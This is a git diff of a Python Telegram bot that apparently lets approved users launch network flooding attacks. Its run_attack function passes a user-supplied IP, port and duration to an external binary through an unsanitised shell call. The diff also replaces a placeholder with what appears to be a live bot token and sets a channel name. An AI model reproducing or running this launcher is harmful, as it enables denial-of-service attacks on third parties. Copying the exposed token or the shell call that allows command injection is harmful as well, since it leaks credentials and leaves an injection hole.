@@ -4,10 +4,10 @@ from telegram.ext import Application, CommandHandler, CallbackContext
 import os
 
 # Configuration
-TELEGRAM_BOT_TOKEN = ("TELEGRAM_BOT_TOKEN")  # Fetch token from environment variable
+TELEGRAM_BOT_TOKEN = ("7819992909:AAHn51FAfPId42gmKUT5wPmCoyC4_g9OeN0")  # Fetch token from environment variable
 ADMIN_USER_ID = 1662672529
 APPROVED_IDS_FILE = 'approved_ids.txt'
-CHANNEL_ID = "@channel username "  # Replace with your channel username
+CHANNEL_ID = "@Godxcheatsaloneboy"  # Replace with your channel username
 attack_in_progress = False
 
 # Check if the token is set
@@ -174,7 +174,7 @@ async def run_attack(chat_id, ip, port, time, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./pushparaj {ip} {port} {time} 500",
+            f"./pushpa {ip} {port} {time} 500",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
